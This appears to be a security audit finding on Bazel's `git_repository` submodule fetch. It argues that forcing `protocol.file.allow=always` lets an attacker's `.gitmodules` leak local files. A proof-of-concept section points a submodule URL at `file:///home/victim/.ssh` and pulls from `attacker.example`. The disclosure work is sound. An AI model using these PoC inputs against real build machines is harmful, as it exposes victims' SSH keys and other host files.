### Title
`git_repository`/`new_git_repository` submodule fetch force-enables `protocol.file.allow=always`, permitting local-clone file exfiltration via attacker-controlled `.gitmodules` - (File: tools/build_defs/repo/git_worker.bzl)

### Summary
When `init_submodules`/`recursive_init_submodules` is set on `git_repository` or `new_git_repository`, Bazel's `update_submodules` unconditionally runs `git -c protocol.file.allow=always submodule update --init ...` [1](#0-0)  This overrides Git's own security hardening (`protocol.file.allow=user`, added to fix CVE-2022-39253) globally for the submodule fetch, re-enabling the "local clone" fast path (hardlinking/copying objects from a local filesystem path) for any submodule URL that resolves to a local path or `file://` URI — even though the top-level repository itself was fetched from a remote, untrusted origin.

### Finding Description
`git_repository`/`new_git_repository` clone the declared `remote` and then, if submodules are requested, run `git submodule update --init` (optionally `--recursive`) via argv-based `ctx.execute` calls [2](#0-1) . The submodule URLs are **not controlled by the Bazel user or the root module** — they come from the `.gitmodules` file inside the fetched repository, i.e. from content published entirely by the (potentially hostile) upstream Git host that the `remote` attribute points to.

Git's `protocol.file.allow=user` default (introduced as a hardening measure after CVE-2022-39253, where a malicious `.gitmodules` submodule URL pointing at a local path could trigger Git's "local clone" optimization and hardlink/leak arbitrary files reachable via symlinks from the victim's filesystem into the newly created repository) is explicitly defeated here: Bazel passes `-c protocol.file.allow=always` to every submodule-update invocation, both for the recursive and non-recursive cases [1](#0-0) . This re-enables the exact local-transport fast path Git deliberately restricted, for content whose `.gitmodules` is entirely attacker-controlled.

Nothing in `git.bzl`/`git_worker.bzl` validates or restricts submodule URLs to remote-only schemes, nor is there any checksum/integrity pinning of submodule content (unlike `http_archive`'s `sha256`) [3](#0-2) . The invocation itself is argv-based (no shell interpolation), so classic shell/ssh option-injection (the literal CVE-2017-1000117 mechanism) is not reachable here, but the analogous "untrusted-repo content controls a local Git operation" invariant is broken via the local-clone/file-protocol path instead.

### Impact Explanation
An attacker who controls (or compromises) the content of a Git repository that a victim references via `git_repository`/`new_git_repository` with submodules enabled can craft a `.gitmodules` entry whose submodule URL is a local path or `file://` URI containing symlinks. Because `protocol.file.allow=always` is force-set, Git will perform the local-clone optimization and can hardlink or copy files from arbitrary locations on the build machine's filesystem (subject to what Git's local-clone/symlink traversal reaches) into the external repository directory that Bazel subsequently exposes to the build (`external/<repo>/...`). Depending on filesystem layout this can leak host files (e.g. credentials, other repos' contents) into build outputs/logs — a read-outside-the-repository/exec-root primitive driven entirely by hostile, unprivileged, remotely-published content.

### Likelihood Explanation
Requires the victim's build to declare a `git_repository`/`new_git_repository` (or `git_override`, which also threads through `init_submodules` [4](#0-3) ) with `init_submodules`/`recursive_init_submodules = True` against a remote that the attacker controls or can influence, and the attacker must have write access to that repository's content — which matches the disclosed threat model: an unprivileged outsider publishing content ("bytes at a dependency URL") the victim's build consumes. This is a common configuration for pulling third-party Git dependencies with submodules; the `-c protocol.file.allow=always` override is unconditional and has no opt-out. It is also the exact issue tracked by bazelbuild/bazel#17040 referenced in the code comment, which describes making local submodule clones "just work" without noting the reintroduced local-transport exposure.

### Recommendation
Do not force `protocol.file.allow=always` globally for submodule updates against untrusted remotes. Only relax `protocol.file.allow` when the top-level `remote` itself is a local path (the legitimate use case referenced by #17040), and otherwise leave Git's default (`user`) protections in place so a malicious `.gitmodules` cannot trigger local-clone file access. Alternatively, restrict submodule URL schemes to remote transports (http(s)/ssh/git) before invoking `submodule update` when the parent repository was fetched from a non-local `remote`.

### Proof of Concept
1. Host (or compromise) a Git repository `evil.git` whose `.gitmodules` declares:
   ```
   [submodule "leak"]
       path = leak
       url = file:///home/victim/.ssh
   ```
   with the submodule commit pointing at a tree containing a symlink crafted per the CVE-2022-39253 technique to escape the intended directory.
2. Victim's `MODULE.bazel`/`WORKSPACE` contains:
   ```
   git_repository(
       name = "dep",
       remote = "https://attacker.example/evil.git",
       commit = "<pinned commit>",
       recursive_init_submodules = True,
   )
   ```
3. On `bazel build @dep//...`, `git_worker.bzl`'s `update_submodules` runs:
   `git -c protocol.file.allow=always submodule update --init --recursive --checkout --force` [5](#0-4) 
   which allows Git's local-clone optimization to hardlink/copy files reachable via the `file://` submodule path into `external/+git_repository+dep/leak`, independent of what the victim intended to fetch remotely.
4. A `src/test/shell/bazel/starlark_git_repository_test.sh`-style integration test (reusing the existing submodule test harness, e.g. `test_git_repository_submodules_with_recursive_init_modules` [6](#0-5) ) can be extended to add a `file://`-scheme submodule with a symlink-based CVE-2022-39253 payload and assert that content outside the intended checkout tree becomes readable under `bazel-bin`.

```text
def _update(ctx, git_repo):
    ctx.delete(git_repo.directory)

    init(ctx, git_repo)
    add_origin(ctx, git_repo, ctx.attr.remote)
    fetch(ctx, git_repo)
    reset(ctx, git_repo)
    clean(ctx, git_repo)

    if git_repo.recursive_init_submodules:
        ctx.report_progress("Updating submodules recursively")
        update_submodules(ctx, git_repo, recursive = True)
    elif git_repo.init_submodules:
        ctx.report_progress("Updating submodules")
        update_submodules(ctx, git_repo)
```

```text
def update_submodules(ctx, git_repo, recursive = False):
    if recursive:
        # "protocol.file.allow=always" allows the submodule command clone from a local directory.
        # It's necessary for Git 2.38.1 and assoicated backport versions.
        # See https://github.com/bazelbuild/bazel/issues/17040
        _git_maybe_shallow(ctx, git_repo, "-c", "protocol.file.allow=always", "submodule", "update", "--init", "--recursive", "--checkout", "--force")
    else:
        _git_maybe_shallow(ctx, git_repo, "-c", "protocol.file.allow=always", "submodule", "update", "--init", "--checkout", "--force")
```

```shellscript
function test_git_repository_submodules_with_recursive_init_modules() {
  local outer_planets_repo_dir=$TEST_TMPDIR/repos/outer-planets

  # Create a workspace that clones the outer_planets repository.
  cat >> MODULE.bazel <<EOF
git_repository = use_repo_rule('@bazel_tools//tools/build_defs/repo:git.bzl', 'git_repository')
git_repository(
    name = "outer_planets",
    remote = "$outer_planets_repo_dir",
    tag = "1-submodule",
    recursive_init_submodules = 1,
    build_file = "//:outer_planets.BUILD",
)
EOF

  cat > BUILD <<EOF
exports_files(['outer_planets.BUILD'])
EOF
  cat > outer_planets.BUILD <<EOF
filegroup(
    name = "neptune",
    srcs = ["neptune/info"],
    visibility = ["//visibility:public"],
)

filegroup(
    name = "pluto",
    srcs = ["pluto/info"],
    visibility = ["//visibility:public"],
)
EOF

  mkdir -p planets
  cat > planets/BUILD <<EOF
genrule(
    name = "planet-info",
    srcs = [
        "@outer_planets//:neptune",
        "@outer_planets//:pluto",
    ],
    outs = ["planet-info.txt"],
    cmd = "cat \$(SRCS) > \$@",
)
EOF

  bazel build //planets:planet-info >& $TEST_log \
    || echo "Expected build/run to succeed"
  cat bazel-bin/planets/planet-info.txt > $TEST_log
  expect_log "Neptune is a planet"
  expect_log "Pluto is a planet"
}
```
